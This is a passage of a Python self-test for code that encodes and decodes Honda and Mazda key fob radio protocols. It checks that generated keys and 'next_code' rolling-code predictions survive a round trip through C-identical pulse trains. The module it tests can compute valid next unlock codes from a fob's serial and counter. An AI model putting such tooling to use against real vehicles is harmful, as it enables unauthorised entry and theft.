            res = _decode_one(HondaV1, _honda_v1_build_upload(key))
            hit = next((r for r in res if r["key"] == key), None)
            good = (hit is not None and hit["serial"] == serial and hit["btn"] == button
                    and hit["cnt"] == cnt and hit["crc_ok"])
            if not good:
                ok = False
                print("    FAIL btn=%d cnt=%04X key=%016X crc=(%X,%X) -> %s"
                      % (button, cnt, key, first, second, hit))
    # next_code sanity
    nc = honda_v1_next_code(serial, 0, 0x1234)
    if nc["cnt"] != 0x1235 or nc["key"] != honda_v1_encode(serial, 0, 0x1235):
        ok = False
        print("    FAIL next_code:", nc)
    print("  [Honda V1] round-trip all buttons/counters + next_code: %s" % ("PASS" if ok else "FAIL"))
    return ok


def _test_honda_v2():
    ok = True
    serial = 0x1234AB & 0xFFFFFF
    print("  [Honda V2] signatures: Unlock=0x%06X  Lock=0x%06X" % (HONDA_V2_SIG_UNLOCK, HONDA_V2_SIG_LOCK))
    # Unlock signature has key-bit1 == 0, so it round-trips fully.
    for count in (0, 1, 7, 42, 255, 256, 511):
        key = honda_v2_build_key(HONDA_V2_SIG_UNLOCK, serial, count)
        res = _decode_one(HondaV2, _honda_v2_build_upload(key, count))
        hit = next((r for r in res if r["key"] == key), None)
        good = (hit is not None and hit["serial"] == serial
                and hit["btn"] == HONDA_V2_BTN_UNLOCK and hit["cnt"] == count
                and hit["sig"] == HONDA_V2_SIG_UNLOCK and hit["check_ok"] and hit["tail_ok"])
        if not good:
            ok = False
            print("    FAIL Unlock count=%d key=%016X -> %s" % (count, key, hit))
    nc = honda_v2_next_code(HONDA_V2_SIG_UNLOCK, serial, 42)
    if nc["cnt"] != 43 or nc["key"] != honda_v2_build_key(HONDA_V2_SIG_UNLOCK, serial, 43):
        ok = False
        print("    FAIL next_code:", nc)
    print("  [Honda V2] check-bits (linear) + tail-parity verified via round-trip.")
    print("  [Honda V2] Unlock round-trip + next_code: %s" % ("PASS" if ok else "FAIL"))

    # Honest note on the Lock signature: the C encoder forces on-wire key-bit 1
    # to 0 (manual add_bit(false)); 0xC2 has that bit set, so a Lock frame the C
    # encoder produces decodes back with signature 0x820363 (button Unknown) even
    # though serial/counter/check/tail are intact. We reproduce that faithfully.
    key = honda_v2_build_key(HONDA_V2_SIG_LOCK, serial, 7)
    res = _decode_one(HondaV2, _honda_v2_build_upload(key, 7))
    hit = res[0] if res else None
    print("  [Honda V2] Lock note: encoder-forced bit1 -> decoded sig=0x%06X btn=%s "
          "(serial/cnt/check still OK=%s)"
          % (hit["sig"] if hit else 0, honda_v2_button_name(hit["btn"]) if hit else "?",
             bool(hit and hit["serial"] == serial and hit["cnt"] == 7 and hit["check_ok"])))
    return ok


def _test_mazda_v0():
    ok = True
    serial = 0x89ABCDEF
    print("  [Mazda V0] sync byte=0x%02X tail byte=0x%02X; checksum = mod-256 byte sum"
          % (MAZDA_V0_SYNC_BYTE, MAZDA_V0_TAIL_BYTE))
    for button in (0x01, 0x02, 0x04, 0x08):
        for cnt in (0x00001, 0x0ABCD, 0x12345, 0xFFFFE, 0xFFFFF):
            key = mazda_v0_encode(serial, button, cnt)
            res = _decode_one(MazdaV0, _mazda_v0_build_upload(key))
            hit = next((r for r in res if r["key"] == key), None)
            good = (hit is not None and hit["serial"] == serial and hit["btn"] == button
                    and (hit["cnt"] & 0xFFFFF) == cnt and hit["crc_ok"])
            if not good:
                ok = False
                print("    FAIL btn=%02X cnt=%05X key=%016X -> %s" % (button, cnt, key, hit))
    nc = mazda_v0_next_code(serial, 0x02, 0x12345)
    if nc["cnt"] != 0x12346 or nc["key"] != mazda_v0_encode(serial, 0x02, 0x12346):
        ok = False
        print("    FAIL next_code:", nc)
    print("  [Mazda V0] round-trip all buttons/counters + next_code: %s" % ("PASS" if ok else "FAIL"))
    return ok


if __name__ == "__main__":
    print("=" * 72)
    print("pp_honda_mazda self-test (encode -> C-identical pulse train -> decode)")
    print("=" * 72)
    r1 = _test_honda_v1()
    print("-" * 72)
    r2 = _test_honda_v2()
    print("-" * 72)
    r3 = _test_mazda_v0()
    print("=" * 72)
    print("RESULT: Honda V1 %s | Honda V2 %s | Mazda V0 %s"
          % ("PASS" if r1 else "FAIL", "PASS" if r2 else "FAIL", "PASS" if r3 else "FAIL"))
    print("OVERALL: %s" % ("PASS" if (r1 and r2 and r3) else "FAIL"))
